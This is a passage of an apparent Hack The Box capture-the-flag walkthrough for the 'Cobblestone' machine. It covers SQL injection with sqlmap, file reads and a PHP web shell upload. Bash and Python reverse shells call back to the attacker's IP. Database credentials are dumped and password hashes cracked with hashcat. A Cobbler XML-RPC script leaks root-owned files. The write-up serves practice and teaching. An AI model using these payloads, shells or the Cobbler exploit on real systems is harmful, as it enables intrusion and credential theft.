[10:15:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[10:15:46] [INFO] the back-end DBMS operating system is Linux
[10:15:46] [INFO] fetching file: '/etc/apache2/sites-available/000-default.conf'
[10:15:46] [INFO] resumed: 3C5669727475616C486F7374202A3A38303E0A0952657772697465456E67696E65204F6E0A0952657772697465436F6E642025
do you want confirmation that the remote file '/etc/apache2/sites-available/000-default.conf' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[10:15:48] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[10:15:48] [INFO] retrieved: 1334
[10:16:04] [INFO] the remote file '/etc/apache2/sites-available/000-default.conf' is larger (1334 B) than the local file '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-available_000-default.conf' (51B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-available_000-default.conf (size differs from remote file)

[10:16:04] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 10:16:04 /2025-08-13/
```

```bash
└─$ cat /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-available_000-default.conf
<VirtualHost *:80>
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]
        ServerName 127.0.0.1
        ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
        ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>

<VirtualHost *:80>
        ServerName cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/html

        <Directory /var/www/html>
                AAHatName cobblestone
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]

        Alias /cobbler /srv/www/cobbler

        <Directory /srv/www/cobbler>
                Options Indexes FollowSymLinks
                AllowOverride None
                Require all granted
        </Directory>

</VirtualHost>

<VirtualHost *:80>
        ServerName deploy.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/deploy

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$
        RewriteRule /.* http://deploy.cobblestone.htb/ [R]
</VirtualHost>

<VirtualHost *:80>
        ServerName vote.cobblestone.htb

        ServerAdmin cobble@cobblestone.htb
        DocumentRoot /var/www/vote

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$
        RewriteRule /.* http://vote.cobblestone.htb/ [R]
</VirtualHost>
```

We can see there is port `25151` in the `cobbler_api` part. <br>
Gonna discuss this later on.

Now let's create `shell.php` and use `sqlmap` to upload and reverse shell.

```php
<?php system($_GET['cmd']); ?>

<?php system($_REQUEST['cmd']); ?>
```

```bash
└─$ sqlmap -r req --batch --file-write shell.php --file-dest /var/www/vote/shell.php
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:18:16 /2025-08-13/

[11:18:16] [INFO] parsing HTTP request from 'req'
[11:18:16] [INFO] resuming back-end DBMS 'mysql' 
[11:18:16] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=225'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=http://vote.cobblestone.htb/index.php' AND 5901=5901 AND 'HaTg'='HaTg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=http://vote.cobblestone.htb/index.php' AND (SELECT 1771 FROM (SELECT(SLEEP(5)))Nfcz) AND 'egFU'='egFU

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=http://vote.cobblestone.htb/index.php' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x6145494f4c7a53735276666843686a5749724b69696a574768636f4e6c4c4e424e6756506a49794c,0x71707a7071),NULL,NULL,NULL-- -
---
[11:18:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:18:17] [INFO] fingerprinting the back-end DBMS operating system
[11:18:18] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[11:18:18] [INFO] the back-end DBMS operating system is Linux
[11:18:20] [WARNING] expect junk characters inside the file as a leftover from UNION query
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/vote/shell.php')? [Y/n] Y
[11:18:20] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:18:20] [INFO] retrieved: 34
[11:18:29] [INFO] the remote file '/var/www/vote/shell.php' is larger (34 B) than the local file 'shell.php' (30B)
[11:18:29] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 11:18:29 /2025-08-13/
```

Success upload and checking out `whoami`.

![Shell](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_shell.png)

Next up, to reverse shell, we gonna use `base64` to encode the command.

```bash
└─$ echo 'bash -i >& /dev/tcp/10.xx.xx.xx/3333 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi8zMzMzIDA+JjEK
```

Use the `penelope` to catch the reverse shell.

```bash
└─$ penelope -p 3333 
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Then using the `curl` to send the request.

```bash
curl "http://vote.cobblestone.htb/shell.php?cmd=echo%20'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zNi8zMzMzIDA+JjEK'%20|%20base64%20-d%20|%20bash"
```

But wait for a second and got nothing, seems like not working. <br>
Also for the upload `shell.php` part, we can manually do it via `UNION` query.

```bash
99999' UNION ALL SELECT NULL,NULL,NULL,"<?php system($_GET['cmd']) ?>",NULL INTO OUTFILE '/var/www/vote/shell.php'-- -
```

![Shell](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_shell_2.png)

Just paste the query to the suggestion part and hit enter.

![Shell](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_shell_3.png)

We will also got the same result.

So it looks like the bash command is not working. <br>
&rarr; Gonna use the python command to catch the reverse shell.

```bash
└─$ curl "http://vote.cobblestone.htb/shell.php?cmd=python3+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.xx.xx.xx%22%2C3333%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport+pty%3B+pty.spawn%28%22%2Fbin%2Fbash%22%29%27"
```

```bash
└─$ penelope -p 3333
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[-] Spawn MANUALLY a new shell for this session to operate properly
[-] Spawn MANUALLY a new shell for this session to operate properly
[+] Got reverse shell from cobblestone.htb~10.129.xx.xx-UNIX 😍 Assigned SessionID <1>
[!] This shell is already PTY
[!] Cannot detect shell. Abort upgrading...
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/cobblestone.htb~10.129.xx.xx-UNIX/2025_08_13-12_20_38-602.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[-] Spawn MANUALLY a new shell for this session to operate properly
ls -la
total 100
drwxr-xr-x 9 root  root   4096 Aug 13 11:20 .
drwxr-xr-x 5 root  root   4096 Aug 13 11:20 ..
-rw-r--r-- 1 root  root     56 Sep 30  2024 composer.json
-rw-r--r-- 1 root  root  13867 Sep 30  2024 composer.lock
drwxr-xr-x 2 root  root   4096 Apr 23 07:57 css
drwxr-xr-x 2 root  root   4096 Sep 30  2024 db
-rw-r--r-- 1 root  root   2831 Apr 24 08:09 details.php
-rw-r--r-- 1 root  root   1150 Sep 30  2024 favicon.ico
drwxr-xr-x 2 root  root   4096 Oct  1  2024 img
-rw-r--r-- 1 root  root   6520 Apr 24 08:12 index.php
drwxr-xr-x 2 root  root   4096 Oct  1  2024 js
-rw-r--r-- 1 root  root   6369 Apr 24 07:40 login.php
-rw-r--r-- 1 root  root   1046 Apr 24 07:55 login_verify.php
-rw-r--r-- 1 root  root    101 Sep 30  2024 logout.php
-rw-r--r-- 1 root  root   1984 Apr 24 07:42 register.php
-rw-r--r-- 1 mysql mysql    42 Aug 13 11:20 shell.php
-rw-r--r-- 1 root  root    844 Apr 24 08:06 suggest.php
drwxr-xr-x 2 root  root   4096 Sep 30  2024 templates
drwxr-xr-x 5 root  root   4096 Sep 30  2024 vendor
drwxr-xr-x 2 root  root   4096 Sep 30  2024 webfonts
www-data@cobblestone:/var/www/vote$
```

There we go! We are in the `www-data` user.

After going around, we found this `connection.php` file.

```bash
www-data@cobblestone:/var/www/vote/db$ cat connection.php 
<?php

$dbserver = "localhost";
$username = "voteuser";
$password = "thaixu6eih0Iicho]irahvoh6aighxxx";
$dbname = "vote";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
```

Let's check out with `mysql` to see what we can find.

```bash
www-data@cobblestone:/var/www/vote/db$ mysql -h 127.0.0.1 -u voteuser -p'thaixu6eih0Iicho]irahvoh6aighxxx'                    p'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 70
Server version: 10.11.11-MariaDB-0+deb12u1-log Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| vote               |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use vote;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [vote]> show tables;
+----------------+
| Tables_in_vote |
+----------------+
| users          |
| votes          |
+----------------+
2 rows in set (0.001 sec)

MariaDB [vote]> select * from users;
+----+----------+-----------+----------+------------------------+--------------------------------------------------------------+
| id | Username | FirstName | LastName | Email                  | Password                                                     |
+----+----------+-----------+----------+------------------------+--------------------------------------------------------------+
|  1 | admin    | Admin     |          | cobble@cobblestone.htb | $2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./<SNIP>                |
| 10 | 2fa0n    | conan     | shinichi | 2fa0n@gmail.com        | $2y$10$2zG2Gsy3XRjIvWz97QCEne2Av3Umb5xcG7QExxB9Y1JXmy/pkVY4e |
+----+----------+-----------+----------+------------------------+--------------------------------------------------------------+
2 rows in set (0.001 sec)
```

```bash
└─$ hashid hash.txt                                        
--File 'hash.txt'--
Analyzing '$2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./<SNIP>'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'hash.txt'--
```

Identify and use `hashcat` to crack it.

```bash
└─$ hashcat -h | grep -i bcrypt                            
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

```bash
└─$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

&rarr; Waiting for a while and still can not crackable so we gonna discover more.

```bash
www-data@cobblestone:/var/www/vote$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:25151         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:69              0.0.0.0:*                           -                   
udp6       0      0 :::69                   :::*                                -                   
www-data@cobblestone:/var/www/vote$
```

We can confirm that there is port `25151` is running and this one is quite interesting.

After a while recon, we found out another `connection.php` file.

```bash
www-data@cobblestone:/var/www/html/db$ cat connection.php 
<?php

$dbserver = "localhost";
$username = "dbuser";
$password = "aichooDeeYanaekungei9rogi0exxxxx";
$dbname = "cobblestone";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>
```

Let's check out if we can got some credentials.

```bash
www-data@cobblestone:/var/www/html/db$ mysql -h 127.0.0.1 -u dbuser -p'aichooDeeYanaekungei9rogi0exxxxx'                  
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2105
Server version: 10.11.11-MariaDB-0+deb12u1-log Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cobblestone        |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use cobblestone;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [cobblestone]> show tables;
+-----------------------+
| Tables_in_cobblestone |
+-----------------------+
| skins                 |
| suggestions           |
| users                 |
+-----------------------+
3 rows in set (0.001 sec)

MariaDB [cobblestone]> select * from users;
+----+----------+-----------+----------+------------------------+-------+------------------------------------------------------------------+-------------+
| id | Username | FirstName | LastName | Email                  | Role  | Password                                                         | register_ip |
+----+----------+-----------+----------+------------------------+-------+------------------------------------------------------------------+-------------+
|  1 | admin    | admin     | admin    | admin@cobblestone.htb  | admin | <SNIP>                                                           | *           |
|  2 | cobble   | cobble    | stone    | cobble@cobblestone.htb | admin | <SNIP>                                                           | *           |
+----+----------+-----------+----------+------------------------+-------+------------------------------------------------------------------+-------------+
2 rows in set (0.001 sec)
```

Okay, so we got other type of hash to crack.

```bash
└─$ hashid hashes.txt
--File 'hashes.txt'--
Analyzing '<SNIP>'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256) 
Analyzing '<SNIP>'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256) 
--End of file 'hashes.txt'--
```

So this one gonna be `sha256` hash but `hashcat` got a lot of mode for this one. <br>
&rarr; We gonna use `hashcat` to crack it without mode to let it identify the hash type that closest to the one we got.

```bash
└─$ hashcat hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz, 1424/2912 MB (512 MB allocatable), 4MCU

The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated

Please specify the hash-mode with -m [hash-mode].

Started: Thu Aug 14 00:13:31 2025
Stopped: Thu Aug 14 00:13:35 2025
```

Let's go with the first one.

```bash
└─$ hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz, 1424/2912 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

<SNIP>:iluvdannymorethanxxxxxxx
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: hashes.txt
Time.Started.....: Wed Aug 13 12:30:29 2025 (21 secs)
Time.Estimated...: Wed Aug 13 12:30:50 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   846.0 kH/s (0.43ms) @ Accel:256 Loops:1 Thr:1 Vec:16
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 76%

Started: Wed Aug 13 12:29:40 2025
Stopped: Wed Aug 13 12:30:52 2025
```

Got it `cobble:iluvdannymorethanxxxxxxx`. <br>
&rarr; SSH to it and got the user flag.

```bash
└─$ ssh cobble@cobblestone.htb         
cobble@cobblestone.htb's password: 
cobble@cobblestone:~$ ls -la
total 32
drwx------ 3 cobble cobble 4096 Jul 24 14:41 .
drwxr-xr-x 3 root   root   4096 Jul 24 14:41 ..
-rwx------ 1 root   root      1 Oct  1  2024 .bash_history
-rwx------ 1 cobble cobble  220 Oct  1  2024 .bash_logout
-rwx------ 1 cobble cobble 3526 Oct  1  2024 .bashrc
-rwx------ 1 cobble cobble  807 Oct  1  2024 .profile
drwx------ 2 cobble cobble 4096 Jul 24 14:41 .ssh
-rw-r----- 2 root   cobble   33 Aug 13 15:39 user.txt
cobble@cobblestone:~$ cat user.txt
3cb03fxxxxxxxxxxxxxxxxxxxxxxxxxx
```

BOOM! Got the `user.txt` flag.

## Initial Access
After initial to `cobble` user, when we typing some command like checking the network status.

```bash
cobble@cobblestone:~$ netstat -tunlp
-rbash: netstat: command not found
```

We got this and take a while to google to found out this blog [How to breakout of rbash restricted bash](https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e).

> For this part, I have not tried it yet to see it works or not so if you can successfully breakout of rbash restricted bash, please let me know. :3

### XML-RPC discovery
So back to what we got that we found port `25151`, we gonna use ssh portfwarding to forward it to our kali machine.

```bash
└─$ ssh -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
cobble@cobblestone.htb's password: 
cobble@cobblestone:~$
```

![Cobblestone](/assets/img/cobblestone-htb-season8/cobblestone-htb-season8_cobblestone.png)

We got **Error response** with code `501` means that unsupported method (GET) and also got reason is that *Server does not support this operation*. <br>
&rarr; This one only accept the `POST` request, let's try out with it.

Taking a research and found out [Cobbler XMLRPC API](https://github.com/cobbler/cobbler/wiki/XMLRPC-API) and we can know that: <br>
- Linux provisioning server - deploy operating systems.
- PXE boot management - network-based OS installation.
- Configuration management - automated system setup.
- XML-RPC API on port 25151 for remote management.

```bash
└─$ cat /home/kali/.local/share/sqlmap/output/vote.cobblestone.htb/files/_etc_apache2_sites-available_000-default.conf
<VirtualHost *:80>
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^cobblestone.htb$
        RewriteRule /.* http://cobblestone.htb/ [R]
        ServerName 127.0.0.1
        ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
        ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>
```

## Privilege Escalation
### Exploiting Cobbler
Search for vulnerabilities and found out this one [Cobbler Multiple Vulnerabilities](https://tnpitsecurity.com/blog/cobbler-multiple-vulnerabilities/) and also [Cobbler XMLRPC API](https://github.com/cobbler/cobbler/issues/2795). <br>
&rarr; Combine these and we got a script to exploit it.

```py
import xmlrpc.client

KERNEL = "/boot/vmlinuz-6.1.0-37-amd64"
INITRD = "/boot/initrd.img-6.1.0-37-amd64"
TARGET = "/root/root.txt"
NAME = "pwnsys"
DEST = "/leak"

srv = xmlrpc.client.ServerProxy("http://127.0.0.1:25151/RPC2", allow_none=True)
tok = srv.login("", -1)

# Create fake distribution
did = srv.new_distro(tok)
srv.modify_distro(did,"name","pwn_distro", tok)
srv.modify_distro(did,"arch","x86_64", tok)
srv.modify_distro(did,"breed","redhat", tok)
srv.modify_distro(did,"kernel", KERNEL, tok)
srv.modify_distro(did,"initrd", INITRD, tok)
srv.save_distro(did, tok)

# Create fake profile
pid = srv.new_profile(tok)
srv.modify_profile(pid,"name","pwn_profile", tok)
srv.modify_profile(pid,"distro","pwn_distro", tok)
srv.save_profile(pid, tok)

# Create system with file mapping
sid = srv.new_system(tok)
srv.modify_system(sid,"name", NAME, tok)
srv.modify_system(sid,"profile","pwn_profile", tok)
srv.modify_system(sid,"template_files", {TARGET: DEST}, tok)
srv.save_system(sid, tok)

# Trigger synchronization
srv.sync(tok)
```

This script is gonna abuse Cobbler features to copy arbitrary files from server to web accessable location.

> *This script was supported by [2ubZ3r0](https://app.hackthebox.com/users/682632) so big shoutout to him.*

After running the script, we gonna manually XML-RPC call to get the file.

```bash
└─$ curl -X POST http://127.0.0.1:25151 -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>get_template_file_for_system</methodName><params><param><value><string>pwnsys</string></value></param><param><value><string>/leak</string></value></param></params></methodCall>'
<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><string>bf043exxxxxxxxxxxxxxxxxxxxxxxxxx
</string></value>
</param>
</params>
</methodResponse>
```

There we go, we got the content of the `root.txt` flag.

> *So for this machine, there is also an unintended way to get user and root from xss and then admin session hijacking, so I gonna update this part if got time before the machine patch it.*

![result](/assets/img/cobblestone-htb-season8/result.png)

And that is all for season 8, 13 week with great and interesting machines that so much to learn and enjoy. Really appreciate the effort of the author and also thanks to community and friends for supporting on these journey.

*See you in the season 9. :3*

![overall](/assets/img/cobblestone-htb-season8/overall.png)